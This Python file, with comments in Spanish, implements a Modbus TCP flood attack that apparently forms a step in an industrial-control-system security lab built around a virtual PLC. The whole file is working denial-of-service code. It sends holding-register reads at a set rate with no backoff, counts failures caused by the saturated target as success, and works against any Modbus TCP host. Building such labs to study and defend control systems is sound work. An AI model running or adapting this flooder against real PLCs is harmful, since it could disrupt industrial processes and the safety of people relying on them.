"""Ataque de flood/DoS (Bloque D, Paso 17).

Genera tráfico Modbus a alta frecuencia para saturar un PLCVirtual, usando
conexiones TCP reales (sin spoofing ni paquetes crudos) — no necesita scapy
ni privilegios especiales, corre igual en Windows, Linux o dentro de Docker.
"""

import asyncio

from pymodbus.client import AsyncModbusTcpClient


async def inundar(
    host: str, puerto: int, intensidad_pps: int, duracion_seg: float, slave: int = 1
) -> int:
    """Envía lecturas Modbus a `intensidad_pps` paquetes/seg durante
    `duracion_seg`, sin backoff ni espera de reintentos — el objetivo es
    saturar el PLCVirtual, no comunicarse de forma prolija.

    Devuelve la cantidad de paquetes efectivamente enviados (incluye los que
    fallaron por saturación del propio objetivo, que es la señal de que el
    ataque está funcionando).

    Nota de entorno: en Windows, `asyncio.sleep()` tiene un piso de
    granularidad de ~15.6ms (temporizador del SO), así que a intensidades
    altas (ej. 250 pps = período de 4ms) el pps real logrado en desarrollo
    local va a quedar bien por debajo del pedido — no es un bug de este
    código. Linux (el entorno real de despliegue, Bloque G) no tiene ese
    piso; volver a medir ahí antes de asumir que el número es el mismo.
    """
    if intensidad_pps <= 0:
        raise ValueError("intensidad_pps debe ser > 0")

    periodo = 1.0 / intensidad_pps
    client = AsyncModbusTcpClient(host, port=puerto)
    await client.connect()

    enviados = 0
    loop = asyncio.get_event_loop()
    fin = loop.time() + duracion_seg
    try:
        while loop.time() < fin:
            inicio_iter = loop.time()
            try:
                await client.read_holding_registers(address=0, count=1, slave=slave)
            except Exception:
                pass  # timeout/error del objetivo saturado: cuenta igual como paquete enviado
            enviados += 1

            # Descontar el tiempo que ya consumió la llamada de red, si no el
            # pps real queda muy por debajo del pedido a intensidades altas
            # (250 pps = periodo de 4ms, más chico que la latencia de red).
            transcurrido = loop.time() - inicio_iter
            await asyncio.sleep(max(0.0, periodo - transcurrido))
    finally:
        client.close()

    return enviados
